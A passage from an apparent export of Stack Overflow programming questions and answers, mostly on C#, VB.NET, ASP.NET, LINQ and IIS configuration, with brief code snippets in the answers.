ptrHeapArray -= 10; // reset the pointer to its original location

for(int f=0; f&lt;10; f++)
    cout &lt;&lt; ptrHeapArray[f]  &lt;&lt; ""\n"";
</code></pre>
"
"<p>What is the VB.NET syntax for declaring the size of an array of objects at runtime?</p>

<p>To get an idea of what I mean, here is the code so far:</p>

<pre><code>Private PipeServerThread As Thread()

Public Sub StartPipeServer(NumberOfThreads As Integer)
    ' ??? equivalent of C#
    ' ???   PipeServerThread = new Thread[numberOfThreads];
    ' ??? goes here
    For i = 0 To NumberOfThreads - 1
        PipeServerThread(i) = New Thread(New ThreadStart(AddressOf ListeningThread))
        PipeServerThread(i).Start()
    Next i
End Sub
</code></pre>

<p>I've tried several things but just end up conflating it with object creation syntax.</p>
","33708","","<pre><code>PipeServerThread = New Thread(numberOfThreads - 1) { }
</code></pre>

<p>Alternatively:</p>

<pre><code>ReDim PipeServerThread(numberOfThreads - 1)
</code></pre>

<p>Remember that the value inside parenthesis is the upper bound of the array in VB.NET (unlike C# where it's array length).</p>
"
"<p>I want to use custom extension on my web site.
I mean, I do not want to use ""default.aspx"", i want to use ""default.customext""</p>

<p>How could i do this in web.config or anywhere else?</p>

<p>ps: I have no chance to change the asp.net configuration on IIS</p>

<p>I am using .NET Framework 3.5, Visual Studio 2008 sp1, and target Server is IIS 7</p>

<p>thank you</p>
","33708","","<p>If you're running on IIS7 integrated mode (which I suggest using), you're good to go. Just map the <code>customext</code> to <code>PageHandlerFactory</code> in <code>&lt;system.webServer&gt;</code> section of Web.config.</p>

<pre><code>&lt;system.webServer&gt;
    &lt;handlers&gt;
        &lt;add name=""CustomExtensionHandler"" 
             path=""*.customext"" 
             verb=""*"" 
             type=""System.Web.UI.PageHandlerFactory"" 
             preCondition=""integratedMode"" /&gt;
    &lt;/handlers&gt;
&lt;/system.webServer&gt;
</code></pre>

<p>IIS7 Classic Mode. Something like:</p>

<pre><code>&lt;system.web&gt;
  &lt;httpHandlers&gt;
     &lt;add path=""*.customext"" 
         verb=""*"" 
         type=""System.Web.UI.PageHandlerFactory, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"" /&gt;
  &lt;/httpHandlers&gt;
&lt;/system.web&gt;
&lt;system.webServer&gt;
  &lt;handlers&gt;
     &lt;add name=""CustomExtensionISAPI"" 
         path=""*.customext"" 
         verb=""*"" 
         modules=""IsapiModule"" 
         scriptProcessor=""C:\Windows\Microsoft.NET\Framework64\v2.0.50727\aspnet_isapi.dll"" preCondition=""classicMode,runtimeVersionv2.0,bitness64"" /&gt;
  &lt;/handlers&gt;
&lt;/system.webServer&gt;
</code></pre>
"
"<p>I have an assmebly that will be used in both a desktop app and an asp.net website.</p>

<p>I need to deal with relative paths (local files, not urls) in either situation.</p>

<p>How can i implement this method?</p>

<pre><code>string ResolvePath(string path);
</code></pre>

<p>Under a web envronment, id expect the method to behave like this (where <code>d:\wwwroot\mywebsite</code> is the folder iis points at):</p>

<pre><code>/folder/file.ext =&gt; d:\wwwroot\mywebsite\folder\file.ext
~/folder/file.ext =&gt; d:\wwwroot\mywebsite\folder\file.ext
d:\wwwroot\mywebsite\folder\file.ext =&gt; d:\wwwroot\mywebsite\folder\file.ext
</code></pre>

<p>for a desktop environment: (where <code>c:\program files\myprogram\bin\</code> is the path of the .exe)</p>

<pre><code>/folder/file.ext =&gt; c:\program files\myprogram\bin\folder\file.ext
c:\program files\myprogram\bin\folder\file.ext =&gt; c:\program files\myprogram\bin\folder\file.ext
</code></pre>

<p>I'd rather not inject a different <code>IPathResolver</code> depending on what state its running in.</p>

<p>How do I detect which environment I'm in, and then what do i need to do in each case to resolve the possibly-relative path?</p>

<p>Thanks</p>
","33708","","<p>As mentioned in John's comment, relative to what? You can use <code>System.IO.Path.Combine</code> method to combine a base path with a relative path like:</p>

<pre><code> System.IO.Path.Combine(Environment.CurrentDirectory, relativePath);
</code></pre>

<p>You can replace <code>Environment.CurrentDirectory</code> in the above line with whatever base path you want.</p>

<p>You could store the base path in the configuration file.</p>
"
"<p>I was wondering if anyone knew how to compile a text query for sql compact that goes like this :</p>

<pre><code>command.CommandText = ""SELECT * FROM tableName WHERE id = binary_Data""
</code></pre>

<p>The id column is a 32 byte binary column that is indexed and ""binary_Data"" is the binary data to compare to, but I am not sure how to get a ""binary_Data"" into the text query so sql can compare it.</p>
","33708","","<p>The best way is to use parameters:</p>

<pre><code>command.CommandText = ""SELECT * FROM TableName WHERE id = @binary_data"";
command.Parameters.AddWithValue(""@binary_data"", byteArray);
</code></pre>

<p>Alternatively, you could manually build a hex string prefixed with <code>0x</code> to create a binary literal to append to the query but it's not recommended.</p>
"
"<p>What is the preferable way for transferring some items (not all) from one list to another.</p>

<p>What I am doing is the following:</p>

<pre><code>var selected = from item in items
               where item.something &gt; 10
               select item;

otherList.AddRange(selected);

items.RemoveAll(item =&gt; selected.Contains(item));
</code></pre>

<p>In the interest of having the fastest/best code there is, is there a better way?</p>
","33708","","<p>I suggest:</p>

<pre><code>var selected = items.Where(item =&gt; item.Something &gt; 10).ToList();
items = items.Except(selected).ToList();
otherList.AddRange(selected);
</code></pre>
"
"<p>I would like to use a WebSite project instead of a Web Application project for an MVC project.</p>

<p>What is the best way to accomplish this and are there signifigant problems that I might run into?</p>

<p>(as a side note, my reasoning for wanting this is because I have graphic designers who put files into SVN but they don't get added to the ""project"" and don't show up on deployment or deployment testing. My thought was that switching to a Web Site project might prevent this)</p>
","33708","","<p>You don't need to do anything special if you are not using <code>CodeBehind</code> files (if you're using them, it'll be more complex but anyway, it's an MVC app. If you're using them, don't!). Just take an MVC Web app project and put all source files (*.cs) under <code>App_Code</code> directory of the Web site. That said, I fail to see any advantage for it.</p>
"
"<p>I want to upload a file from a web application.  The web application calls web services to access .NET classes, but it's not a .NET application itself.</p>

<p>What I want to do is this:  upload a file from the web application, and call a separate .NET page to process and handle the uploaded file.</p>

<p>It would be easy to do this if I used a php script to process the uploaded file, but I particularly want to use .NET to process it.</p>

<p>Has anyone done this? </p>
","33708","","<p>Easy. </p>

<pre><code>Request.Files
</code></pre>

<p>will handle that. To make it work, you should submit it as a valid HTML <code>multipart/form-data</code> POST request.</p>

<p><a href=""http://msdn.microsoft.com/en-us/library/system.web.httprequest.files.aspx"" rel=""nofollow"">MSDN Library: HttpRequest.Files property</a></p>

<p>The other option is to post the entire file as the request body (which is probably easier from the sender application's perspective) and then use <a href=""http://msdn.microsoft.com/en-us/library/system.web.httprequest.binaryread.aspx"" rel=""nofollow""><code>Request.BinaryRead</code></a> method or <a href=""http://msdn.microsoft.com/en-us/library/system.web.httprequest.inputstream.aspx"" rel=""nofollow""><code>Request.InputStream</code></a> to process it. I've personally used the latter method in an application that needed to upload images to a Web server:</p>

<pre><code>byte[] image = context.Request.BinaryRead(context.Request.ContentLength);
</code></pre>
"
"<p>How would you generate RSS using ASP.Net MVC? I have the data in the database already and I'll transform it as necessary. My first approach is to create an RSS template that I use as a view, but that seems error prone and since RSS is a structured format there could be a class that I set some properties and generates RSS. Is there such a thing? How would you do it?</p>
","33708","","<p>Use <a href=""http://msdn.microsoft.com/en-us/netframework/aa663324.aspx"" rel=""nofollow"">WCF</a> <code>System.ServiceModel.Syndication</code> namespace for which you need to add System.ServiceMode.Web to your references. That handles the whole thing automatically:</p>

<pre><code>using System.ServiceModel.Syndication;
// ...
var rss = new SyndicationFeed(...);
...
var formatter = new Rss20FeedFormatter(rss);
formatter.WriteTo(xmlWriter);
</code></pre>
"
"<p>Currently I have an object implementing the IComparable interface (ASP.NET 3.5, VB). When I place several instantiated objects into a Generics list, I sort them by doing a simple <code>someList.Sort</code>. My <code>CompareTo()</code> function is this:</p>

<pre><code>Public Function CompareTo(ByVal obj As Object) As Integer Implements 
System.IComparable.CompareTo
	'default is number of votes (opposite direction, highest first)'
	Dim sent As Sentence = CType(obj, Sentence)
	Return Not Points.CompareTo(sent.Points)
End Function
</code></pre>

<p>This works fine, except now I need to sort by another property, the DateSubmitted property, as a subset of the Points.  For example, if three sentences have votes: 3, 1, 1, I want the one with the highest votes first (obviously) and of the two sentences with one vote, the one submitted the earliest to be listed.</p>

<p>Is this possible with CompareTo(), or should I just hit the database again and sort it there?</p>

<p>Thanks</p>
","33708","","<p>Since you're on .NET 3.5, you can sort using the <code>OrderBy</code> extension method easily:</p>

<pre><code>Dim someSortedList = someList.OrderBy(Function(item) item.SomeColumn) _
                             .ThenBy(Function(item) item.SomeOtherColumn)
                             .ToList()

' OrderByDescending and ThenByDescending are also there for descending order
</code></pre>

<p>Whether you should hit the database again or not depends on how you've retrieved data in the first place. If you have a large data set and you had retrieved only a small subset of it from the DB, then no, you should just ask the DB to grab a small subset of data based on the new sort order. Otherwise, if you already have the whole thing in memory, just sort it as I mentioned above.</p>
"
"<p>I know this is a micro-optimization, so I ask out of pure curiosity. </p>

<p>Logically, a microprocessor does not need to compare all the bits of both operands of an equality operator in order to determine a ""FALSE"" result.</p>

<p>Note, this is programming-related because it affects the execution speed of a program.</p>
","33708","","<p>Usually, the microprocessor does comparison using electrical gates and not step by step like that. It checks all bits at once. </p>
"
"<p>I'm trying to produce an IF conditional statement inside of a ""select new"" that checks the values of two fields in order to fill a property.</p>

<pre><code>from e in Employees
where e.EmployeeID == id
select new {
    EmployeeID = e.EmployeeID,
    EmployeeName = e.FirstName + "" "" + e.LastName,
    Status = (if e.col1.HasValue then ""This Value"" else if e.col2.HasValue then ""Other Value"")
}
</code></pre>

<p>The columns are nullable and therefore the column types are DateTime? data types.</p>

<p>Only one or the other column will have a datetime value, not both.</p>

<p>How do I go about doing this???</p>
","33708","","<pre><code>Status = e.col1.HasValue ? ""This Value"" : (e.col2.HasValue ? ""Other Value"" : null)
</code></pre>
"
"<p>Is there a way to copy a class in C#? Something like var dupe = MyClass(original).</p>
","33708","","<p>Not all classes have this functionality. Probably, if a class does, it provides a <code>Clone</code> method. To help implement that method for your own classes there's a <code>MemberwiseClone</code> protected method defined in <code>System.Object</code> that makes a shallow copy of the current instance (i.e. fields are copied; if they are reference types, the reference will point to the original location).</p>
"
"<p>I have a asp.net web site. I want to invoke MS word on a Client machine. Is there any easy way to do this with VS2008, C#3.0?</p>

<p>I can do this with Qt and with an ActiveX control but trying to avoid going this way...</p>

<p>would silverlight be a way to go?</p>
","33708","","<p>You want to execute an application from the browser (without the evil ActiveX things, of course)?! If you could do that, probably you could wipe off the whole disk too.</p>

<p>And no, Silverlight runs in a partially trusted sandbox. It won't run unmanaged executables on the client machine.</p>
"
"<p>Is it a best practice to commit a .sln file to source control? When is it appropriate or inappropriate to do so?</p>

<p><strong>Update</strong>
There were several good points made in the answers. Thanks for the responses!</p>
","33708","","<p>You should definitely have it. Beside the reasons other people mentioned, it's needed to make one step build of the whole projects possible.</p>
"
"<p>I've got a class representing an interval. This class has two properties ""start"" and ""end"" of a comparable type. Now I'm searching for an efficient algorithm to take the union of a set of such intervals.</p>

<p>Thanks in advance. </p>
","33708","","<p>Use the <a href=""http://en.wikipedia.org/wiki/Sweepline"" rel=""nofollow"">sweep line</a> algorithm. Basically, you sort all the values in a list (while keeping whether it's beginning or end of the interval along with each item). This operation is O(n log n). Then you loop in a single pass along the sorted items and compute the intervals O(n). </p>

<p>O(n log n) + O(n) = O(n log n)</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br />
  <a href=""http://stackoverflow.com/questions/522637/should-objects-delete-themselves-in-c"">Should objects delete themselves in C++?</a>  </p>
</blockquote>

<p>In my application, I'm creating many objects that ""own themselves"" - in the sense that after they are created and told to ""go,"" only the object itself can determine when it should be deleted.</p>

<p>For example, if I was writing a game, I might have multiple <code>Enemy</code> objects.  Only the <code>Enemy</code> object knows when it should die.</p>

<p>As a result, I end up using <code>delete this</code> inside some of the member functions inside the <code>Enemy</code> object.  Is this bad form?  Is this something I should avoid, and if so, what is the correct way to handle this type of situation?</p>
","33708","","<p>Depends on the memory management strategy. There are cases that it really makes sense and it's the correct thing. For instance, in a reference counting system like COM, the object would do a <code>delete this</code> when the refcount gets down to zero.</p>
"
"<p>I'm working on a bug where code is not always being executed before an application shuts down. The code was in a handler for the AppDomain.CurrentDomain.DomainUnload event.</p>

<p>I found a post by someone with the same problem who received this advice </p>

<p>""By the time the DomainUnload event happens for your default app domain, your
code has stopped executing. You can probably do what you need to with the
ProcessExit event on the default AppDomain.""</p>

<p>This worked for me but I would like to know why. I haven't been able to find much on either of these events or on the differences between them. I'm also wondering if I need to subscribe to both or is the ProcessExit sufficient.</p>

<p>EDIT:</p>

<p>I wanted to add more information to make this a little more useful.</p>

<p>I left out that new threads were being created in their own AppDomain. Since I wanted this code to run not only when the parent process was done but also when each thread finished I needed to subscribe to the DomainUnload event to handle when each thread finished and also the ProcessExit event to catch when the parent process finished.</p>
","33708","","<p><code>ProcessExit</code> should be sufficient.</p>

<p>The <code>DomainUnload</code> event is designed to be handled by other AppDomains, not the <code>AppDomain</code> being unloaded. As a result, if the handler is attached in the domain being unloaded, it might not run. The <code>ProcessExit</code> event is designed to run when the process is <em>going to</em> exit. </p>
"
"<p>I have a sql statement that uses Difference =>
<a href=""http://msdn.microsoft.com/en-us/library/ms188753.aspx"" rel=""nofollow"">http://msdn.microsoft.com/en-us/library/ms188753.aspx</a></p>

<p>I do this in a stored proc but  i want to change to LINQ. Is there an equal to Difference in LINQ?</p>

<p>Ex: 
     <code>WHERE (DIFFERENCE(C.LastName, ''' + @name  + ''') &gt;= 4</code></p>

<p>Thanks</p>
","33708","","<p>No, there's no .NET method that translates to that.</p>
"
"<p>In the Essential C# 3.0 book, there is a part where it says:</p>

<blockquote>
  <p>""Projection using the select() method
  is very powerful. We already saw how
  to filter a collection <strong>vertically</strong>
  (reducing the number of items in the
  collection) using the Where() standard
  query operator. Now, via the Select()
  standard query operator, we can also
  reduce the collection <strong>horizontally</strong>
  (making fewer columns) or transform
  the data entirely. In combination,</p>
  
  <p>Where() and Select() provide a means
  for extracting only the pieces of the
  original collection that are desirable
  for the current algorithm.""</p>
</blockquote>

<p>What does horizontally and vertically means in this case? Do these methods enumerate on a collection differently?</p>
","33708","","<p>No, they enumerate the collection alike. </p>

<p>If you think of a collection as a set of objects (rows), each with some properties (columns) like a database table. You could filter the results out by removing some rows (<em>vertically</em>) by specifying a condition using <code>Where</code> or remove a set of columns by <code>Select</code>ing a subset of properties (<em>horizontally</em>).</p>
"
"<p>Does <a href=""http://en.wikipedia.org/wiki/Endianness"" rel=""nofollow"">endianness</a> matter at all with the bitwise operations? Either <a href=""http://stackoverflow.com/questions/1036141/bitwise-not-operator-in-c-with-regards-to-little-endian-and-big-endian"">logical</a> or shifting? </p>

<p>I'm working on homework with regard to bitwise operators, and I can not make heads or tails on it, and I think I'm getting quite hung up on the endianess. That is, I'm using a little endian machine (like most are), but does this need to be considered or is it a wasted fact? </p>

<p>In case it matters, I'm using C.</p>
","33708","","<p>You haven't specified a language but usually, programming languages such as C abstract endianness away in bitwise operations. So no, it doesn't matter in bitwise operations.</p>
"
"<p>If I do a post from jquery like so:</p>

<pre><code>$.post(""Row/getRowNames"", { currRow: ""MyRow"", offset: 3 },
        function(rowNames) {
            /* How do I interpret the data to 
        },
""json"");
</code></pre>

<p>How do I interpret the data rowNames that's passed back from the method in the controller? I need to turn the json result into an array of strings some how...</p>

<p>Here's the Controller method that gets the row names:</p>

<pre><code>    [AcceptVerbs(HttpVerbs.Post)]
    public JsonResult getRowNames(string currRow, int offset)
    {
        return this.Json(_rowRepository.getRowNamesByOffset(currRow, offset));
    }
</code></pre>

<p>and <code>getRowNamesByOffset(currRow, offset)</code> returns an array of strings.</p>

<p>I'm really not sure how Json works, what is it doing to the array before it passes it back to the javascript? How is the javascript supposed to manipualte the Json in order to get the data it needs?</p>
","33708","","<p>You don't need to do anything. JSON <strong>is</strong> native Javascript object representation. Just use the <code>rowNames</code> in the function as if it where an array declared in Javascript.</p>

<p>To have the Javascript interpreter parse it, use <code>eval</code> function passing the result as an argument. This can have some security consequences if you are getting the data from an untrusted source. For that matter, you could use some JSON parser Javascript libraries around to handle the parse task safely (as they won't execute possible Javascript statements inside as <code>eval</code> does). </p>
"
"<p>When I try</p>

<pre><code>user = System.Web.UI.Page.CurrentUser
</code></pre>

<p>or</p>

<pre><code>user = System.Web.UI.Page.User.Identity
</code></pre>

<p>I get an error saying that the method is not defined for System.Web.UI.Page... I am trying to access it within a Controller, does that matter?</p>

<p>I've checked to make sure that I do not have another class named Page, Why would it say the method is not defined?</p>

<p>Thanks,<br/>
Matt</p>
","33708","","<p>There are many ways to do it (basically, they are all the same)</p>

<pre><code>User.Identity // in the controller
HttpContext.User.Identity // in the controller
System.Web.HttpContext.Current.User.Identity // anywhere
</code></pre>

<p><code>Page.User</code> property works when there's a <code>Page</code> HTTP handler that's processing the current request. As in an MVC controller, the request has not been handed to a <code>Page</code> class, it won't work.</p>

<p>in the controller.</p>
"
"<p>I'm trying to build Hello World in x64 assembly on my Leopard MacBook Pro. It assembles fine, but I get this error when I try to link it: <i>ld: symbol dyld_stub_binding_helper not defined (usually in crt1.o/dylib1.o/bundle1.o) for inferred architecture x86_64</i></p>

<p>I loaded it with <i>ld -o hello64 hello64.o -lc</i></p>

<p>My assembler is Yasm.</p>

<p>EDIT: As far as I can tell, unlike for 32-bit code, you have to supply the stub helper yourself, and since I don't know how the 64-bit stub helper works I'll do as Bastien said and have GCC link it since it includes it's own stub helper.</p>

<p>Doh! ld would have included crt1.o automatically if my assembly's entry point had been <code>_main</code> instead of <code>_start</code>.</p>
","33708","","<p>You haven't specified an assembler. Personally, I had done this before using <code>yasm</code> assembler (and had written a blog post in that regard but since my blog has been down for a long time, I can't post a link). Basically, a hello world would be:</p>

<pre><code>SECTION .data
   hello db 'hello, world', 10
   hellolen equ $ - hello

SECTION .text
   global start

start:
   mov rax, 0x2000004    ; sys_write
   mov rdi, 1            ; stdout 
   mov rsi, qword hello  ; string
   mov rdx, hellolen     ; length
   syscall
   mov rax, 0x2000001    ; sys_exit
   xor rdi, rdi          ; exit code
   syscall
</code></pre>

<p>Assembled with:</p>

<pre><code>yasm -f macho64 file.asm
ld a.o
./a.out
</code></pre>
"
"<p>In C# if I want to parse a datetime, but some times I just have either a date and not a time component or no date but a time component, how would I do this? Usualy when you leave out the time component, it automaticly assumes that the time is 12:00AM. But I don't want this. If the time component is missing then I just want the DateTime to store a date only and the leave the time component off. </p>
","33708","","<p>It's not possible to have a <code>DateTime</code> without a time component. You could store a boolean flag along with it in a <code>struct</code> to store data about existence of that component. However, there's no way to use the automatic parsing routine to distinguish between a <code>DateTime</code> string with a time specified as <code>12:00 PM</code> and a nonexistent one.</p>
"
"<p>I am getting back a image from SQL server as a byte[]. Can I use xsl transform to convert it into an actual image for a webpage? How, may I do so if this is possible?</p>
","33708","","<p>Your question is not clear. I can't see a relation between an image and an XSL transformation. Are you using an SVG image?</p>

<p>If you are storing something like a JPEG image, you could create an ASP.NET Handler that fetches that from DB as a <code>byte[]</code> and use <code>Response.BinaryWrite</code> method to stream that to the client.</p>
"
"<p>How to to configure SMTP mail in IIS 7?</p>

<p>I am new to IIS 7 and want to know how to configure that, or its better to keep using the IIS 6 SMTP?</p>

<p>Any one know where to find some videos to learn SMTP in IIS 7?</p>
","33708","","<p>The IIS7 SMTP server is managed using IIS6 management console.</p>
"
"<p>Basically, from what I've understood of the little I've managed to search up on the internet, threads can pass between AppDomains. Now, I've written the following code:</p>

<pre><code>    const string ChildAppDomain = ""BlahBlah"";
    static void Main()
    {
        if (AppDomain.CurrentDomain.FriendlyName != ChildAppDomain)
        {
            bool done = false;
            while (!done)
            {
                AppDomain mainApp = AppDomain.CreateDomain(ChildAppDomain, null, AppDomain.CurrentDomain.SetupInformation);
                try
                {
                    mainApp.ExecuteAssembly(Path.GetFileName(Application.ExecutablePath));
                }
                catch (Exception ex)
                {
                    // [snip]
                }
                AppDomain.Unload(mainApp);
            }
        }
        else
        {
            // [snip] Rest of the program goes here
        }
    }
</code></pre>

<p>This works fine and everything is clicking into place... The main thread passes through into the new version of my program and starts running through the main application body. My question is, how would I go about getting it to go back out to the parent <code>AppDomain</code>? Is this possible? What I'm trying to achieve is sharing an instance of a class between the two domains.</p>
","33708","","<p>You cannot share instances of classes directly between <code>AppDomain</code>s. To do so, you should derive the class from <code>MarshalByRefObject</code> and use remoting to access the instance from the other <code>AppDomain</code>.</p>
"
"<p>At <a href=""http://blogs.msdn.com/ericgu/archive/2004/01/29/64717.aspx"" rel=""nofollow"">http://blogs.msdn.com/ericgu/archive/2004/01/29/64717.aspx</a>, we learn that C# will not inline methods with structs as formal parameters.  Is this due to potential dependence on the stack, e.g. for recursion?  If so, could I potentially benefit by turning struct parameters into ref parameters like this?</p>

<pre><code>public int Sum(int i)
{
  return array1[i] + array2[i];
}
</code></pre>

<p>turns into:</p>

<pre><code>public int Sum(ref int i)
{
  return array1[i] + array2[i];
}
</code></pre>

<p>Edit:  I went to attempt a test, but I can't get anything in inline.  Here is what I tried:</p>

<pre><code>class Program
{
  private static string result;
  static void Main(string[] args)
  {
    Console.WriteLine(MethodBase.GetCurrentMethod().Name);
    Console.WriteLine();
    m1();
    Console.WriteLine(result);
  }
  private static void m1()
  {
    result = MethodBase.GetCurrentMethod().Name;
  }
}
</code></pre>

<p>It prints ""m1"" as the second line, which indicates that it did not get inlined.  I built a Release build and ran it with Ctrl-F5 (to not attach the debugger).  Any ideas?</p>
","33708","","<p>As Jon said, it's a very old post. I can confirm that in the following code:</p>

<pre><code>using System;
using System.Runtime.CompilerServices;

struct MyStruct
{
   public MyStruct(int p)
   {
      X = p;
   }
   public int X;

   // prevents optimization of the whole thing to a constant.
   [MethodImpl(MethodImplOptions.NoInlining)]
   static int GetSomeNumber()
   {
       return new Random().Next();
   }

   static void Main(string[] args)
   {
      MyStruct x = new MyStruct(GetSomeNumber());
      // the following line is to prevent further optimization:
      for (int i = inlinetest(x); i != 100 ; i /= 2) ; 
   }

   static int inlinetest(MyStruct x)
   {
      return x.X + 1;
   }
}
</code></pre>

<p><code>inlinetest</code> method is inlined.</p>

<p>Main method disassembly:</p>

<pre><code>; set up the stack frame:
00000000  push        ebp
00000001  mov         ebp,esp 

; calls GetSomeNumber:
00000003  call        dword ptr ds:[005132D8h] 

; inlined function:
00000009  inc         eax  

; the dummy for loop:
0000000a  cmp         eax,64h 
0000000d  je          0000001B 
0000000f  sar         eax,1 
00000011  jns         00000016 
00000013  adc         eax,0 
00000016  cmp         eax,64h 
00000019  jne         0000000F 
0000001b  pop         ebp  
0000001c  ret
</code></pre>

<p>I've tested this on x86 .NET Framework 3.5 SP1 on Windows 7 x64 RC.</p>

<p>As I believed there's nothing inherently wrong with inlining methods with <code>struct</code> parameters. Probably, JIT has not been smart enough at that time.</p>
"
"<p>What I'm looking for is a RegEx to mix the character case of a given string for use in functional testing.</p>

<p>Example Input:</p>

<pre><code>The Quick Brown fox jumps over the Lazy Dog.
</code></pre>

<p>Sample Expected Output:</p>

<pre><code>tHe QUiCk BrOwn FoX jUMPs OvER tHe lAzY dOg.
</code></pre>

<p>It would be nice if the output was different every time the RegEx were applied. For example, given the above input, another time the RegEx were applied, the output could be:</p>

<pre><code>THe qUIcK bROwN fOX JuMpS oVeR THe lAzy DoG.
</code></pre>

<p>I know that it would be easy to simply set up a substitution table (e.g., 'x' => 'X', 'B' => 'b'), but that is not what I'm looking for.</p>

<p>I did a Google search for this and came up with nothing, although I know it has been done. I had code (now lost) that did this.</p>
","33708","","<p><code>RegEx</code> is supposed to do something deterministic and not random. In C# you could achieve it using something like this:</p>

<pre><code>var random = new Random();
var result = new string(((IEnumerable&lt;char&gt;)input.ToLowerInvariant())
              .Select(x =&gt; random.Next(2) == 0 ? x : Char.ToUpperInvariant(x))
              .ToArray());
</code></pre>
"
"<p>I'm working on sorting a list of objects, and unfortunately, I'm not quite getting the information from the debugging to see where I'm going wrong.</p>

<p>I have a custom class that I implemented a CompareTo method in, and I call .Sort() on a List of items of that class. Unfortunately, my program never actually gets to the compareTo() method...it errors out and shutdowns down immediately on the call to the .Sort().</p>

<p>What generally should I be on the look out for?</p>

<p>Here's my class definition, interface listing for the class.</p>

<pre><code>    /// &lt;summary&gt;
/// Summary description for ClientWorkspace.
/// &lt;/summary&gt;
public class ClientWorkspace : IStorable
{ }
</code></pre>

<p>I didn't list the compareTo method since it never even gets to that code.</p>
","33708","","<p><code>IStorable</code>? What's that? It's not named <code>Sortable</code> in .NET.</p>

<pre><code>public class ClientWorkspace : IComparable&lt;ClientWorkspace&gt;
{ }
</code></pre>
"
"<p>Is there a preferred algorithm for converting a 2-digit year into a 4-digit year?</p>

<p>I have a 2-digit birth date (along with month and day) that I want to convert to a C# <code>DateTime</code>. Obiviously, birthdates cannot be in the future, but is there an existing facility in .NET to convert a 2-digit year into a four-digit year? </p>
","33708","","<pre><code>static int GetFourDigitYear(int year, int maxYear) 
{
    System.Globalization.GregorianCalendar cal = 
          new System.Globalization.GregorianCalendar();
    cal.TwoDigitYearMax = maxYear;
    return cal.ToFourDigitYear(year);
}
</code></pre>

<p><code>maxYear</code> should be the current four digit year.</p>

<p><hr /></p>

<p><strong>Edit</strong>: OP's solution:</p>

<pre><code>static int GetFourDigitYear(int year, int pivot) 
{
    System.Globalization.GregorianCalendar cal = 
          new System.Globalization.GregorianCalendar();
    cal.TwoDigitYearMax = new DateTime.Year + (100-pivot);
    return cal.ToFourDigitYear(year);
}
</code></pre>
"
"<p>I use to use IDL and MatLab in college and now that I have been working for some years I miss the : notation for indexing into arrays. I.E.</p>

<pre><code>arrray[1:5]
</code></pre>

<p>which would return an array from elements from 1 to 5. Another example is </p>

<pre><code>stringVar.Split("")"".ToCharArray())[1:*]
</code></pre>

<p>which would return an array of strings skipping over the first element.</p>

<p><strong>Has anyone seen a way to shoe-horn : notation this into C#?</strong> </p>

<p>I have seen it in some interpreted languages and perl or pythin, can't remeber. </p>

<p><strong>I wonder if this could be done with some operator overriding?</strong></p>
","33708","","<p>Syntactically, there's nothing like this in C# and can't be done with operator overloading. Basically, per C# spec, the lexical analyzer will consider that a syntax error. You could use a third party custom preprocessor to make it work.</p>

<p><code>ArraySegment</code> structure, however, <em>semantically</em> does a similar thing. </p>

<p>If you really love this stuff, consider looking at Python (or IronPython if you want it on .NET platform).</p>
"
"<p>I want to create a function like this...</p>

<pre><code>    [AcceptVerbs(HttpVerbs.Post)]
    public ActionResult SaveImage(string file, string fileName)
    {

    }
</code></pre>

<p>Where the file is the Base64 encoded string created from the image, and the fileName is the name I want to save it as. How can I use this encoded string to write the image to the server?</p>

<p>Do I need to use <code>BinaryWriter</code> or <code>TextWriter</code> or some other one? And how do you decode the data to allow it to write to the server properly?</p>
","33708","","<pre><code>byte[] contents = Convert.FromBase64String(file);
System.IO.File.WriteAllBytes(Server.MapPath(fileName), contents);
</code></pre>
"
"<p>Generally speaking, will a .NET Windows Forms application work in a 64-bit OS or does it need to be modified?</p>
","33708","","<p>If it doesn't rely on a 32 bit external library (e.g. COM component), it'll work perfectly as a 64 bit process and will leverage its benefits (large address space, x64 instruction set, ...). If it relies on 32 bit stuff, most of the time, you can still run it as a 32 bit application by setting the target platform to x86.</p>
"
"<p>What is the fastest way to compare a string with an array of strings in C#2.0</p>
","33708","","<p>If you are doing this many times with a single array, you should sort the array and binary search it:</p>

<pre><code>Array.Sort(array);
int index = Array.BinarySearch(array, input);
// if (index &lt; 0) 
//      does not exists, ""items &gt; ~index"" are larger and ""&lt; ~index"" are smaller
// otherwise, ""items &gt; index"" are larger and ""&lt; index"" are smaller.
</code></pre>

<p>Otherwise just check the whole array naively:</p>

<pre><code>bool exists = Array.IndexOf(array, input) &gt;= 0;
</code></pre>
"
"<p>Suppose I have this function:</p>

<pre><code>void my_test()
{
    A a1 = A_factory_func();
    A a2(A_factory_func());

    double b1 = 0.5;
    double b2(0.5);

    A c1;
    A c2 = A();
    A c3(A());
}
</code></pre>

<p>In each grouping, are these statements identical? Or is there an extra (possibly optimizable) copy in some of the initializations?
I have seen people say both things. Please <strong>cite</strong> text as proof. Also add other cases please.</p>
","33708","","<p><strong>Assignment</strong> is different from <strong>initialization</strong>.</p>

<p>Both of the following lines do <em>initialization</em>. A single constructor call is done:</p>

<pre><code>A a1 = A_factory_func();  // calls copy constructor
A a1(A_factory_func());   // calls copy constructor
</code></pre>

<p>but it's not equivalent to:</p>

<pre><code>A a1;                     // calls default constructor
a1 = A_factory_func();    // (assignment) calls operator =
</code></pre>

<p>I don't have a text at the moment to prove this but it's very easy to experiment:</p>

<pre><code>#include &lt;iostream&gt;
using namespace std;

class A {
public:
    A() { 
    	cout &lt;&lt; ""default constructor"" &lt;&lt; endl;
    }

    A(const A&amp; x) { 
    	cout &lt;&lt; ""copy constructor"" &lt;&lt; endl;
    }

    const A&amp; operator = (const A&amp; x) {
    	cout &lt;&lt; ""operator ="" &lt;&lt; endl;
    	return *this;
    }
};

int main() {
    A a;       // default constructor
    A b(a);    // copy constructor
    A c = a;   // copy constructor
    c = b;     // operator =
    return 0;
}
</code></pre>
"
"<p>I'm looking for a c# wrapper to a native MD5 or SHA1 library to improve hash calculation performance.</p>

<p>Previously I switched SharpZipLib to zlib and got more than 2x performance boost. (ok, you've to take care you've the right zlib.so or zlib.dll depending on the OS and hardware, but it pays off).</p>

<p>Will it be worth for MD5 or SHA1 or both .NET and Mono rely on a native implementation already?</p>

<p>(Edited) Also: in case I've to stick to the MD5CryptoServiceProvider, is there a way in which I can calculate a hash of a file while I'm reading it? I mean, send bytes in chunks but still calculate the whole hash?</p>
","33708","","<p>The <code>SHA1CryptoServiceProvider</code> class uses the underlying Windows API implementation. However, <code>SHA1Managed</code> is pretty fast.</p>

